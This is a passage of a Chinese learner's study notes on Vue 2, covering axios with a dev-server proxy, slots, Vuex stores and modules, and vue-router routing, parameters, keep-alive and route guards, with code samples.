        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点
   2. 使用`transition`包裹过度的元素，并配置name属性：
   3. 备注：若有多个元素需要过度，则需要使用`<transition-group>`，且每个元素都要指定key值

# 第四章：Vue中的Ajax

`npm i axios`

利用axios与本地主机交换信息

## 01_配置代理

**APP.vue**

```
methods:{
            getStudents(){
                axios.get('http://localhost:5000/students').then(
                    response => {
                        console.log('请求成功了', response)
                    },
                    error => {
                        console.log('请求失败了', error.message)
                    }
                )
            }
        }
```

![image-20221030112439172](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221030112439172.png)

出现以上报错信息表示跨域错误，违背了同源策略。**同源策略规定了三个东西必须一致，分别是：协议、主机号、端口号**。在跨域请求时，浏览器会向服务器发起请求，服务器也会返回信息，但是用户拿不到。

解决方法：

1. CORS，后端要做的
2. jsonp 前端和后端一起做，很巧妙的写法，但是用的不多。**面试爱问**
3. **配置代理服务器** 在服务器和浏览器配置一个和服务器同端口号的服务器，由于服务器和服务器之间没有跨域问题，所以信息可以通过代理服务器交换。
   1. nginx 有点难
   2. vue-cli 利用Vue脚手架

**vue.config.js 新建配置项**

```javascript
devServer: {
    proxy: '：http://localhost:5000'
  }
```

**proxy里边应该填写要请求的服务器（代理服务器的端口号是proxy自动生成的），注意不要写上具体的路径，只写到端口号就好**

**APP.vue**

```javascript
methods:{
            getStudents(){
                axios.get('http://localhost:8080/students').then(
                    response => {
                        console.log('请求成功了', response)
                    },
                    error => {
                        console.log('请求失败了', error.message)
                    }
                )
            }
        }
```

**注意，请求的是代理服务器，和浏览器的端口号一样。而且一定要加students**

在脚手架根目录下的public文件夹，可以通过8080加后缀访问到。如果在文件夹中有一个students的文件，那么会默认返回public文件夹下的内容，**不会请求服务器了**。

使用上述代理有两个如下问题：

1. 没有办法链接多个服务器
2. 当本地有相同的文件名时，浏览器会优先访问public中的文件而不是请求服务器

**第二种方式：**

```javascript
proxy: {
      '/atguigu': {
        target: 'http://localhost:5000',
      }
    }
```

当浏览器访问代理服务器时，如果在请求前面加上`/api`前缀，则走代理；否则不走代理。（前缀可以任意更改名称）

使用前缀名时，**在axios接口处地址的端口号后加前缀名**。但是在代理服务器访问服务器时，会请求`/api/xxx`，带上了前缀名，直接报404

需要加上`pathRewrite:{"^/atguigu":""}`pathRewrite属性配置正则表达式，把前缀名干掉

**ws**：用于支持websocket（解释太麻烦自己学）

**changeOrigin**：服务器问代理服务器的端口号，true是代理回复和服务器一样的端口号，false是回复和浏览器的端口号。**用于控制请求头中的host值**

在Vue框架中，上述两个属性不写也是默认为真

想要访问多台服务器就要加属性

完整版代码：
```javascript
devServer: {
    proxy: {
      '/atguigu': {
        target: 'http://localhost:5000',
        pathRewrite:{"^/atguigu":""},
        // ws: true,
        // changeOrigin: true
      },
      '/demo': {
        target:'http://localhost:5001',
        pathRewrite:{"^/demo":""},
      }
    }
  }
```

## 02_github用户搜索案例

一般都是在app.vue引入CSS外部库。如果在script标签中引入，会对CSS文件做一个严格的检查（如字体缺失就会报错）

在app.vue中引入的CSS放在了src/css文件夹下

为了避免因为字体缺失导致编译不出来，将CSS放在public/css，然后在index.html中引入

**index.html**

```html
    <!-- 引入第三方样式 -->
    <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
```

github的开源接口后端已经设计好cors了，可以拿来直接用

**List.vue**注意看注释

```html
<script>
export default {
    name: 'List',
    data() {
        return {
            info: {
                isFirst: true,
                isLoading: false,
                errMsg: '',
                users: []
            }
        }
    },
    mounted() {
        //挂上事件总线的data属性没比要每个都写一个新属性，直接写在函数形参传回数据酒匂
        this.$bus.$on('updateListData', (dataObj) => {
            console.log("我是List组件，收到了数据", dataObj.users)
            //注意把一个对象匹配到了data里边，所以每一个属性都有getter和setter
            //因为有可能不会传isFirst，会破坏数据结构 通过字面量的方式合并对象，重名的属性以后面写的类为主，而且使用类传值可以不用在意属性的顺序
            this.info = {...this.info, ...dataObj}
            //不能直接用this._data=dataObj，因为响应式就被丢掉了，所以最好
        })
    }
}
</script>
```

**Search.vue**

```html
<script>
    import axios from 'axios'
    export default {
        name: 'Search',
        data(){
            return{
                keyWord:''
            }
        },
        methods: {
            searchUsers(){
                //请求前更新List数据
                this.$bus.$emit('updateListData',{isFirst:false,isLoading:true,errMsg:'',users:[]})
                axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
                    res => {
                        this.$bus.$emit('updateListData',{isLoading:false,errMsg:'',users:res.data.items})
                    },
                    err => {
                        console.log("失败：",err.message)
                        //注意loading还要写false，users必须要清空
                        this.$bus.$emit('updateListData',{isLoading:false,errMsg:err.message,users:[]})
                    }
                )
            }
        }
    }
</script>
```

## 03_vue-resource

请求后端数据的方式：

1. xhr
2. jQuery
3. axios
4. fetch
5. vue-resource这是个插件

`npm i vue-resource`

**main.js**

```javascript
import vueResource from 'vue-resource';
Vue.use(vueResource)
```

**List.js**   把axios替换为this.$bus，用法和axios一模一样

```javascript
this.$bus.$on(() => {})
```

建议使用axios

## 04_插槽

如果父元素给子元素传的值不是表达式是单纯的字符串，不要加冒号

父元素给子元素传值，不用非得一个data属性一个名，可以统一起一个名，子元素接受到所有的属性默认归为一个对象类

### 默认插槽

在子组件中的模板部分塞入一个插槽标签，插槽部分的页面由父组件传入。

注意其实插槽部分的CSS渲染是在父组件完成的，当然可以把CSS样式写到子组件间中

**App.vue**

```html
<div class="container">
        <!-- 注意是如何传的，不用非得一个属性一个名 -->
        <category title="美食">
            <img src="../static/1.png" alt="">
        </category>
        <category title="游戏">
            <ul>
                <li v-for="(g, index) in games" :key="index">{{g}}</li>
            </ul>
        </category>
        <category title="电影">
            
        </category>
    </div>
```

**Category.vue**

```html
<div class="category">
        <h3>{{title}}分类</h3>
        <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
        <slot></slot>
    </div>
```

### 具名插槽

如果有两个需要传入插槽的标签，子元素也定义了两个插槽，但是由于没有对应的方法就会每一个插槽都会渲染两个标签

可以给插槽增加name属性，如果父组件没有标签对应插槽，在插槽中写的内容为默认值渲染在页面。

比如我想让很多个多级标签装载到一个插槽上，可以利用template标签内打上slot属性名，这样既不增加页面结构也不会让一个插槽名写很多遍

只有template写slot属性名可以写`<template v-slot:xxx>`其他标签只能写`slot="xxx"`

**Category.vue**

```html
<div class="category">
        <h3>{{title}}分类</h3>
        <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
        <slot name="center">默认值1</slot>
        <slot name="footer">默认值2</slot>
    </div>
```

**App.vue**

```html
<div class="container">
        <!-- 注意是如何传的，不用非得一个属性一个名 -->
        <category title="美食">
            <img slot="center" src="../static/1.png" alt="">
            <a slot="footer" href="https://www.baidu.com"></a>
        </category>
        <category title="游戏">
            <ul>
                <li v-for="(g, index) in games" :key="index">{{ g }}</li>
            </ul>
        </category>
        <category title="电影">
            <!-- <template slot="footer">
                <div class="foot">
                    <a href="https://www.baidu.com">经典</a>
                    <a href="https://www.baidu.com">热门</a>
                    <a href="https://www.baidu.com">推荐</a>
                </div>
                <h4>欢迎前来观影</h4>
            </template> -->
            <template v-slot:footer>
                <div class="foot">
                    <a href="https://www.baidu.com">经典</a>
                    <a href="https://www.baidu.com">热门</a>
                    <a href="https://www.baidu.com">推荐</a>
                </div>
                <h4>欢迎前来观影</h4>
            </template>
        </category>
    </div>
```

### 作用域插槽

现在有一个需求，三个列表一个是无序列表，一个是有序列表，一个全是标签

那么只能把标签在父组件中写，然后通过插槽传入子组件。但是所有的数据都在子组件里边，父元素获取不到。

**在Category.vue中：**

```
<slot :games="games"></slot>
```

注意slot不是组件标签，而是内置的slot标签。slot标签把内置的数据传给了插槽的使用者

父组件接收数据必须使用template标签，且标签属性scope要给一个名称赋值接收的数据。返回的数据类型是一个类，key是传入数据使用的标签属性名

**Vue支持解构赋值**，但是我还没学

**Category.vue**

```html
<template>
    <div class="category">
        <h3>{{ title }}分类</h3>
        <slot :games="games"></slot>
    </div>
</template>

<script>
export default {
    name: 'Category',
    props: ['listData', 'title'],
    data() {
        return {
            games: ['红色警戒', '穿越火线', '劲舞团'],
        }
    },
}
</script>
```

**App.vue**

```html
<template>
    <div class="container">
        <!-- 注意是如何传的，不用非得一个属性一个名 -->
        <category title="游戏">
            <template scope="atguigu">
                <ul>
                    <li v-for="(g, index) in atguigu.games" :key="index">{{ g }}</li>
                </ul>
            </template>
        </category>
        <category title="游戏">
            <template scope="atguigu">
                <ol>
                    <li v-for="(g, index) in atguigu.games" :key="index">{{ g }}</li>
                </ol>
            </template>
        </category>
        <category title="游戏">
            <template scope="atguigu">
                <h4 v-for="(g, index) in atguigu.games" :key="index">{{ g }}</h4>
            </template>
        </category>
    </div>
</template>
```

总结：

1. 作用：让父组件可以向子组件指定位置插入HTML结构，也是一种组件间的通信方式，适用于 **父组件===>子组件**
2. 分类：默认插槽、具名插槽、作用域插槽

# 第五章：Vuex

概念：专门在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读写），也是一种组件间通信的方式，且适用于任意组件间的通信

**什么时候用Vuex：**

1. **多个组件依赖于同一状态**
2. **来自不同组件的行为需要变更同一状态**

例如，我利用事件总线实现组件间数据传输与更新，需要重复很多工作。

![IMG_0134](D:\朕还能学\前端笔记\Vue\IMG_0134.PNG)

vuex实现多组件共享数据

## 01_Vuex执行流程

注意select标签下的option，value属性值要是数字的话必须加上冒号

Action：动作，行为

Mutation：一堆加工，一堆维护

State：状态（数据，是一个对象）

大致流程：

* 首先在vc中执行＋2的操作，通过Dispatch派遣路径（这里的Dispatch是一个路径，不代表dispatch接口）向Actions用dispatch接口传递dispatch('jia',2)，第一个参数是字符串类型的动作类型，第二个参数是传的值，告诉actions我要在调用哪个动作传什么数据
* **actions是一个对象，用于响应组件中的动作**。在action接入后，里面一定会有一个key和jia对应，其值是一个函数。要是传入的动作匹配到了key值，那么key对应的函数一定会被调用。通过Commit提交路径（这里的commit是一个路径，不代表commit接口）向Mutations用commit接口传递commit('jia',2)，告诉mutation我要调用哪个方法什么数据
* **mutation也是一个对象——用于操作数据**。在mutation接入后，里面一定会有一个key和jia对应，其值是一个函数。要是传入的动作匹配到了key值，那么key对应的函数一定会被调用。该函数会拿到两个东西，第一个东西是整个state，第二个是参数2。在函数中执行某些代码（例如state.sum += 2） ，那么底层会自动走Mutate路径（这个就不是接口了），把State中的sum改为了2.
* **State用于存储数据**，随后Vuex重新解析随后渲染了组件

注意：

* 在vuex中，所有的接口都由store调用，如何把store放到vc中是一个问题
* actions在一般情况下没啥用。存在一种场景，dispatch只传了行为没有传数据（例如dispatch('jia')），需要访问另外一台服务器拿到参数。Vue允许在组件直接调用Mutations进行对话

## 02_搭建Vuex环境

**注意，在Vue2中，要用vuex的3版本 在vue3中，要用vuex的4版本**

`npm i vuex@3`

```javascript
import Vuex from 'vuex'
Vue.use(Vuex)

new Vue({
	el: '#app',
	render: h => h(App),
	store:'hello'
})
```

需要利用import 和 Vue.use引入store配置项。如果不引入store，直接在配置项写，vm中不会有store属性出现。

注意在mian.js中，必须先调Vue.use(Vuex)然后在创建store instance实例。

![image-20221031204949025](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221031204949025.png)

在vue脚手架中，import语句的执行顺序不会随着中间被插入了几行不是Import的语句而改变，即无论import在哪，脚手架都最先扫描import然后按import的排序执行。

**所以不能在main.js中同时引入vuex和store，即没有方法能让Vue.use(Vuex)先于import store from './store'执行，所以把vuex的引入放到了index.js中。因为Vuex引用需要vue插件，所以在index.js中也要引入Vue。**

**src/store/index.js**

```javascript
//该文件用于创建Vuex中最为核心的代码

//引入Vue，注意引入Vuex要用Vue插件
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)
//准备actions--用于响应组件中的动作
const actions = {}

//准备mutation——用于操作数据
const mutations = {}

//准备state——用于存储数据
const state = {}

//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

在src文件夹的store文件夹下放置Index.js文件，因为index.js文件名称可以被vue识别，所以引用index.js地址不用写/index.js

**mian.js**

```javascript
import Vue from 'vue'
import App from './App.vue'
import vueResource from 'vue-resource'
//引入store,，如果里边定义store的文件叫index.js那不用写index.js也行
import store from './store'

Vue.config.productionTip = false

//使用插件
Vue.use(vueResource)

new Vue({
    el: '#app',
    render: h => h(App),
    store,
    beforeCreate(){
        Vue.prototype.$bus = this
    }
})
```

## 03_求和案例Vuex版

根据上节所学

* 需要先在state中载入响应式数据
* 在组件中，需要通过dispatch接口通过键值对找方法`this.$store.dispatch('xxx',value)`
* 在action中，配置对应的函数，函数的参数`xxx(context,value){}`有两个，第一个是context，即ministore，是store的简写版（函数中的this就是store），里边可以获得各种接口和state；第二个是传的值。注意此时的键（函数名）通常为全大写，为了区分action和Mutation中的方法。在函数内部调用commit接口，在mutation中找方法名和传值`context.commit('XXX',value)`。
  * 注意dispatch可以不接受传参，即上一步的第二个参数可缺省，则意味着action里边进行了和服务器交互并拿到了数据，再commit。
* 在mutation中定义函数并操作state中的数据。一个函数有两个参数\``XXX(state,value){}`，第一个参数是state，允许mutation直接操作响应式数据，第二个是传的值。
* 在组件中，要通过`this.$store.state.xxx`调用state中的值

**注意任何的业务逻辑都不要写在mutation里边，统一放到action里**。例子中给的奇数再加和延迟加法都可以写在action里边，但绝对不能写在mutation里。

当然，加和减这种简单的操作action属实是没啥用，所以vue允许直接在组件通过commit方法向mutation传值`this.$store.commit('XXX',value)`。

**Count.vue**

```html
<h1>当前求和为：{{$store.state.sum}}</h1>
...
<script>
...
methods: {
        increment() {
            this.$store.commit('JIA', this.n)
        },
        decrement() {
            this.$store.commit('JIAN', this.n)
        },
        incrementOdd() {
            this.$store.dispatch('jiaOdd', this.n)
        },
        incrementWait() {
            this.$store.dispatch('jia', this.n)
        }
    }
</script>
```

**index.js**

```javascript
//准备actions--用于响应组件中的动作
const actions = {
    // jia(context,value){
    //     // console.log(this)
    //     // console.log('actions中的jia被调用了',context,value)
    //     context.commit('JIA',value)
    // },
    // jian(context,value){
    //     context.commit('JIAN',value)
    // },
    jiaOdd(context,value){
        if(context.state.sum % 2){
            context.commit('JIA',value)
        }
    },
    jiaWait(context,value){
        setInterval(() => {
            context.commit('JIA',value)
        },500)
    }
}

//准备mutation——用于操作数据
const mutations = {
    JIA(state,value){
        console.log('mutations中的JIA被调用了',state,value)
        state.sum += value
    },
    JIAN(state,value){
        console.log('mutations中的JIA被调用了',state,value)
        state.sum -= value
    }
}

//准备state——用于存储数据
const state = {
    sum: 0//当前的和
}
```

在action中，由于有可能一个函数的逻辑太多，需要分函数写，也需要用到`context.dispatch`。

## 04_getters配置项

简单说就是store的计算属性

注意不要忘记要把getter也暴露出去

**index.js**

```javascript
//准备getters——用于将state中的数据进行加工
const getters = {
    bigSum(state){
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters//注意getter是一个全新的配置项
})
```

## 05_mapState和mapGetters

```javascript
computed:{
        sum(){
            return this.$store.state.sum
        },
        bigSum(){
            return this.$store.getters.bigSum
        },
        school(){
            return this.$store.state.school
        },
        subject(){
            return this.$store.state.subject
        },
    },  
```

这样一个一个写`this.$store.state`太麻烦



**不要忘记在一开始引入两个语法糖**

```JavaScript
import { mapState,mapGetters } from 'vuex'
```

mapState({})是一个对象，键是自己设置的属性，值是名为mappedState的函数，返回的是mapState值对应state中键的值

注意mapState的值必须要写上引号，因为值对应的是一个函数，**即对象的属性值必须是变量名才能不用写引号**

在计算属性中利用ES6的语法，可以把mapState这个对象中每一个键值对

**对象写法：**

```javascript
// sum(){
//     return this.$store.state.sum
// },
// school(){
//     return this.$store.state.school
// },
// subject(){
//     return this.$store.state.subject
// },
 ...mapState({ sum: 'sum', school: 'school', subject: 'subject' }),
```

注意对象写法没有简写，因为表示`sum: sum`，sum键找的是sum的变量，**对象的属性值必须是变量名才可以在利用对象简写模式**

**数组写法**

```javascript
...mapState(['sum','school','subject']),
```

注意数组写法必须确定属性名和要读取的state中的名一样



**同理mapGetters，数组写法和对象泄愤和mapState规则一致**

```javascript
...mapState(['bigSum']),
        // bigSum() {
        //     return this.$store.getters.bigSum
        // },
```

## 06_mapMutations和mapActions

```javascript
// increment() {
//     this.$store.commit('JIA', this.n)
// },
// decrement() {
//     this.$store.commit('JIAN', this.n)
// },
...mapMutations({increment:'JIA', decrement:'JIAN'}),
```

**注意在上面的写法中，mapMutations中没传参，以increment为例，鼠标点击触发事件，自动传的参数是event。只能在模板里边写上传递的参数**

```html
<button @click="increment(n)">+</button>
```

mapActions略

## 07_vuex组件化+namespace

最好每一个功能配置一个vuex组件

**一个vuex组件是一个对象，注意在暴露时候必须加上modules，代表组件化**

```javascript
const count = {
    namespaced: true,
    actions:{
    },
    mutations:{
    },
    getters : {
    }
}
export default new Vuex.Store({
    modules:{
        count
    }
})
```

如果想在mapState里边通过第一个参数指定分类，在配置vuex时候，需要给每个配置都添加一个`namespaced:true`

`...mapState('分类名',['xxx','xxx])`

```javascript
    computed: {
        ...mapState('count',['sum','school','subject']),
        ...mapGetters('count',['bigSum']),
    },
    methods: {
        ...mapMutations('count',{increment:'JIA', decrement:'JIAN'}),
        ...mapActions('count',{incrementOdd:'jiaOdd', incrementWait:'jiaWait'})
    }
```

一个mapState只能指定一个分类，要想指定两个分类必须写两个mapState

其他映射操作同理。

**注意，getter参数state是指自己分类下的state，不是整个store的state**



**以下是不用映射操作的写法：**
如果要使用commit或dispatch，则需要`this.$store.commit('分类名/方法名',参数)`**中间那个/是调用分类下的方法**

如果要使用getters，注意调用getter要使用`this.$store.getters['分类名/getter属性']`

如果要使用state，按照正常写`this.$store.state.分类名.state属性`



**拆分文件：**

在store文件夹下，有一个Index.js，其余一个模块一个js文件

**xxx.js**

```javascript
export default {
...
}
```

**index.js**

```javascript
import Vue from 'vue'
import Vuex from 'vuex'

import countOptions from './count'
import personOptions from './person'

Vue.use(Vuex)
export default new Vuex.Store({
    modules:{
        countOptions,
        personOptions
    }
})
```

# 第六章：vue-router

**vue-router的理解：vue的一个插件库，专门用来实现SPA应用**

对SPA应用的理解：

1. 单页Web应用(single page web application, SPA)
2. 整个应用只有**一个完整的页面**
3. **点击页面中的导航链接不会刷新页面，只会做页面的**局部更新
4. 数据需要通过ajax请求获取

路由的理解：

1. **什么是路由**
   1. 一个路由就是一组映射关系(key-value)
   2. key为路径，value可能是function或component
2. **路由分类**
   1. 后端路由：
      1. 理解：value是function，用于处理客户端提交的请求
      2. 工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回相应数据
   2. 前端路由：
      1. 理解：value是component，用于展示页面的内容
      2. 工作过程：当浏览器的路径改变时，对应的组件就会显示

## 01_基本路由

`npm i vue-router@3`

注意vue2只支持3版本的vue-router

需要在src文件夹下新创建一个**router**文件夹，里边放上路由器

**注意里边的routes代表路由，不是路由器，没有r**

**src/router/index.js**

```javascript
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../components/About.vue'
import Home from '../components/Home.vue'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },{
            path:'/home',
            component:Home
        },
    ]
})

```

**在main.js也要引入路由器和使用路由器的插件**

```javascript
import Vue from 'vue'
import App from './App.vue'

//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

Vue.config.productionTip = false
Vue.use(VueRouter)

new Vue({
    el: '#app',
    render: h => h(App),
    router,
    beforeCreate(){
        Vue.prototype.$bus = this
    }
})
```

当网址后面出现了`/#/`代表路由配置成功

![image-20221101223030713](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221101223030713.png)

通过路由跳转页面，需要使用`<router-link>`标签，把a标签的href改为to，里边的值不要加·，直接右斜杠加组件名

**App.vue**

```html
<!-- <a class="list-group-item active" href="./about.html">About</a>
                    <a class="list-group-item" href="./home.html">Home</a> -->
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
```

active-class是激活时候的样式

Router-link标签其实就是借助了vueRouter组件又转变为了a标签

**App.vue**

```html
<!-- 指定组件的呈现位置 -->
<router-view></router-view>
```

路由的展示标签

## 02_路由的几个基本注意点

* 我们管由管理的组件叫路由组件，那么如何区分路由组件和普通组件呢
  * 开发当中，我们为了区分上述两种组件，普通组件放到components文件夹里边，路由组件放到pages文件夹里边，和components是同级

* 不用的路由组件其实是被销毁了，可以通过beforeDestory验证一下
* 路由组件的vc上面多了两个东西，一个是$route，一个是$router
  * 每一个路由组件$route都不一样，但是$router（路由器）是一样的

## 03_嵌套（多级）路由

先确定好路由规则再配置路由配置项（先改index.js再改Vue模板）

* 如果路由里边不继续配置路由，则是一级路由
* 下级路由一个全新的配置项：**children**
  * 注意除了一级路由，所有的Path配置项不要再写一开头的右斜杠了，因为底层已经帮你配置好了

**src/router/index.js**

```javascript
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About.vue'
import Home from '../pages/Home.vue'
import News from '../pages/News'
import Message from '../pages/Message.vue'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },{
            path:'/home',
            component:Home,
            children:[
                {
                    path:'news',
                    component:News
                },
                {
                    path:'Message',
                    component: Message
                }
            ]
        },
    ]
})
```

* 注意标签中路由路径要写完整版，不能只写某一集的路由

**Home.vue**

```html
<li>
    <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
</li>
<li>
    <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link>
</li>
```

* 别忘记写`<router-view></router-view>`

## 04_路由传参（query）

如果路由组件需要更换多组数据，不至于给每一个数据专门写一个路由组建

和query相似，在路由路径后面加上问号，参数和值用等于号连接，多组参数用&连接

```javascript
<router-link to="/home/message/detail?id=666&title=你好啊！">{{m.title}}</router-link>
```

子组件通过`$route.query`获得参数

```javascript
computed:{
        query(){
            return this.$route.query
        }
    },
```

如果我传参传的是变量（如m.id）咋写

* to前面加:方法不行，因为整个引号内所有的东西都被当成JS解析了
* 利用模板字符串，**to前面的冒号要保留**，然后在引号内部再加上反引号，表示其仍然是字符串。模板字符串要混入JS的变量，需要用${}。即冒号是把模板字符串当成JS解析，但是有了反引号所以主体仍然是字符串，只不过有JS变量必须要被识别。要是没有引号跳转失败。

**to的字符串写法：**

```html
<!-- 跳转路由并携带query参数，to的字符串写法 -->
<router-link :to='`/home/message/detail?id=${m.id}&title=${m.title}`'>{{m.title}}</router-link>
```

**to的对象写法（推荐）：**

```html
<router-link :to="{
                    path:'/home/message/detail',
                    query: {
                        id:m.id,
                        title:m.title
                    }
                    }">
                    {{m.title}}
                    </router-link>
```

![image-20221102160755431](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221102160755431.png)

## 05_命名路由

用于简化跳转路径

给哪个路由起名字，就要把哪一个路由加上name配置项

**index.js**

```javascript
export default new VueRouter({
    routes:[
        {
            name:'guanyu',
            path:'/about',
            component:About
        },
        ...]})
```

**用名字跳转路径不能写成字符串了，只能写成对象形式，对象要加一个配置项name替换掉path**

**两个用name跳转的组件：**

```html
<router-link class="list-group-item" active-class="active" :to="{name:'guanyu'}">About</router-link>
```

```html
<router-link :to="{
                    name: 'xiangqing',
                    query: {
                        id:m.id,
                        title:m.title
                    }
                }">
                    {{m.title}}
                </router-link>
```

## 06_路由的params参数

以ajax传参为例：

* query传参： localhost:5000?name=tom
* params传参：localhost:5000/tom

**params传参组件写法：**

```html
<router-link :to='`/home/message/detail/${m.id}/${m.title}`'>{{m.title}}</router-link>
```

**或者按对象传递，如果利用params传递参数，对象中不允许用path定位，只能用name**：

```html
<router-link :to="{
                    name: 'xiangqing',
                    params: {
                        id:m.id,
                        title:m.title
                    }
                }">
```

**接受参数的路由组建需要调用$route.params而不是query：**

```html
<script>
	...
    computed:{
        params(){
            return this.$route.params
        }
    },
        ...
</script>
```

但是上述写法无法让vue知道斜杠后面到底是路由还是参数，**需要在路由器每个路由中更改path配置项，加上两个参数的占位**

**index.js**

```javascript
{
                    path:'Message',
                    component: Message,
                    children:[
                        {
                            name:'xiangqing',
                            path:'detail/:id/:title',
                            component: Detail
                        }
                    ]
                }
```

## 07_路由的props配置

如何简便的接受路由传参？

**在被传数据的组件的路由中新建props配置项：**

**index.js，看注释:**

```javascript
{
    name:'xiangqing',
        path:'detail/:id/:title',
            component: Detail,
                //props的第一种写法，值为对象，该对象中的素有key-value都会以props的形式传给Detail组件
                props:{a:1, b:'hello'}
}
```

但是这种写法用得少，传的是死数据

**第二种写法，注意只能传params类型的参数：**

```javascript
{
    name:'xiangqing',
        path:'detail/:id/:title',
            component: Detail,
                //props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组建收到的所有Params参数，以props的形式传给detail组件
                props:true
}
```

**vue组件：**

```javascript
export default {
    name: 'Detail',
    props:['id','title'],
    data(){
        return{

        }
    },
    computed:{
        // query(){
        //     return this.$route.params
        // }
    },
}
```

**props第三种写法：函数法**

**index.js**

```javascript
children:[
    {
            name:'xiangqing',
            path:'detail/:id/:title',
            component: Detail,
            //props的第三种写法，值为函数
            props(){
                return {
                    id: '666',
                    title: '你好啊'
                }
        }
    }
]
```

**在函数中需要一个回调函数。**回调函数就是我们定义的，我们不调用，但最终它执行了

**index.js**

```javascript
props($route){
    return {
        id: $route.query.id,
        title: $route.query.title
    }
}
```

接收参数可以解构赋值，把$route替换成{query}，这样就可以写成query.id和query.title了

**或者可以用解构赋值的连续写法：**

```javascript
props({query:{id,title}}){
                                return {id,title}
                            }
```

**传参数的组件（这次可以用query传了）：**

```html
<router-link :to="{
                    name: 'xiangqing',
                    query: {
                        id:m.id,
                        title:m.title
                    }
                }">
```

**接收参数的路由组件：**

```html
<template>
    <ul>
        <li>消息编号：{{id}}</li>
        <li>消息标题：{{title}}</li>
    </ul>
</template>

<script>
export default {
    name: 'Detail',
    props:['id','title'],
    }
    </script>
```

## 08_router-link的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为push和replace，push是追加历史记录，replace是替换当前记录。路由跳转时候默认为push
3. 如何开启replace模式：见下

push模式：浏览器会把链接存在栈里，新点开一个链接就会存到栈顶，点击返回会一层一层向下找

默认是push模式，要开启replace模式需要在router-link标签中写`:replace="true"`属性，或者直接简写replace

```html
<router-link :replace="true" class="list-group-item" active-class="active" :to="{name:'guanyu'}">About</router-link>
<router-link replace class="list-group-item" active-class="active" to="/home">Home</router-link>
```

## 09_编程式路由导航

通过函数跳转页面，**需要借助$router路由器配置项，不是$route!**

$router的就是VueRouter，最重要的东西在其原型对象上

![image-20221102194421283](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221102194421283.png)

四个重要的属性：

* push：将跳转页面的链接压到栈顶
* replace：将跳转页面的链接替换栈顶
* back：退至上一个链接
* forward：进至下一个链接
* go：传参为整数，正数为向前几步，负数为向后几步

```html
<router-link :to="{
                    name: 'xiangqing',
                    query: {
                        id: m.id,
                        title: m.title
                    }
                }">
                    {{ m.title }}
</router-link>&nbsp;&nbsp;
<button @click="pushShow(m)">push查看</button>
<button @click="replaceShow(m)">replace查看</button>

<script>
	...
	methods: {
        pushShow(m) {
            this.$router.push({
                name: 'xiangqing',
                query: {
                    id: m.id,
                    title: m.title
                }
            })
        },
        replaceShow(m) {
            this.$router.replace({
                name: 'xiangqing',
                query: {
                    id: m.id,
                    title: m.title
                }
            })
        },
    }
    ...
</script>
```

```javascript
methods: {
        back(){
            //仍然在原型对象中，后退
            this.$router.back()
        },
        forward(){
            //前进
            this.$router.forward()
        },
        test(){
            //正数指连续前进n个链接，负数指连续后退n个链接
            this.$router.go(-2)
        }
    }
```

## 10_缓存路由组件

作用：让不展示的路由组建保持挂载，不被销毁

我在第一个页面输入的内容还没编辑完，切换到第二页时再返回发现东西没了。因为在切换页面时上一个页面已经被销毁了

在被切换组件的引用处，加上`<keep-alive><\keep-alive>`标签。例如：我想要让news组件在切换的时候保持里边的信息不被销毁，那么我就需要把引用news组件的`<router-view><\router-view>`标签外边裹上一层`<keep-alive><\keep-alive>`

```html
<keep-alive>
	<router-view></router-view>
</keep-alive>
```

当然也可以指特定的组件。以上的方法在切换两个组件时候都不会销毁，**需要写一个include属性，值是组件名**

```html
<keep-alive include="News">
                <router-view></router-view>
            </keep-alive>
```

如果要指定多个：`:include=['News','xxx',...]` 需要加上冒号和利用数组

## 11_两个专属于路由的生命周期钩子

* activated(){} 激活
* deactivated(){} 失活

前面说到有三个生命周期钩子没有在图中体现，上面两个钩子没有在生命周期那张大图上体现，还有一个是之前讲的nextTick。

生命周期函数指Vue在特殊的时候帮助我们调用的函数

当切换路由的时候既想保留没有编辑好的内容，又想删除一些在切换过后需要暂停的功能，可以利用上述两个钩子

**需要先在路由展示标签（上一节）裹上keep-alive**

```javascript
// beforeDestroy(){
    //     console.log('New组件即将被销毁了')
    //     clearInterval(this.timer)
    // },
    // mounted(){
    //     this.timer = setInterval(() => {
    //         this.opacity -= 0.01
    //         if(this.opacity <= 0) this.opacity = 1
    //     },16)
    // },
    activated(){
        this.timer = setInterval(() => {
            this.opacity -= 0.01
            if(this.opacity <= 0) this.opacity = 1
        },16)
    },
    deactivated(){
        clearInterval(this.timer)
    }
```

## 12_路由守卫（这个东西开发用的很多！！）

保护路由安全，只能在router中写

小场景：在本地存储中存了一个school:atguigu，现在当切换路由时需要校验学校名称是不是atugigu

### 全局前置的路由守卫

**每次路由切换之前被调用、初始化的时候被调用**

`router.beforeEach((to,from,next) => {})`

* from：从哪里来的信息，被包装为对象了
